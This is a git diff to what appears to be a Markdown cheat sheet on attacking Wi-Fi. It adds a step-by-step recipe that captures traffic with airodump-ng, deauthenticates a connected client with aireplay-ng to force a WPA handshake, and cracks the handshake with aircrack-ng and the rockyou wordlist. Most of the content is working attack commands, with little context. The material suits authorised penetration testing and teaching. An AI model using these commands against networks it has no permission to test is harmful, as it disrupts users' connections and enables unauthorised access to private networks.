@@ -63,9 +63,29 @@ sudo airodump-ng wlan0
 ````
 
 
-## capture
+## capture + deauth attack
+
+Capture:
 
 ````shell
-sudo airodump-ng -c <network-channel-number> --bssid <access-point-mac-address> -w output-file network-capture.pcap
+sudo airodump-ng -c <network-channel-number> --bssid <access-point-mac-address> -w output-file capture.txt wlan0
+
+````
+
+
+As soon as a client is detected (`STATION`):
+
+````shell
+sudo aireplay-ng -0 1 -a <access-point-mac-address> -c <client-to-deauth-mac-address> wlan0
+
+````
+
+As soon as the `WPA handshake` is captured, you can stop.
+
+
+## crack
+
+````shell
+sudo aircrack-ng -a 2 -b <access-point-mac-address> -w /usr/share/wordlists/rockyou.txt capture.txt
 
 ````
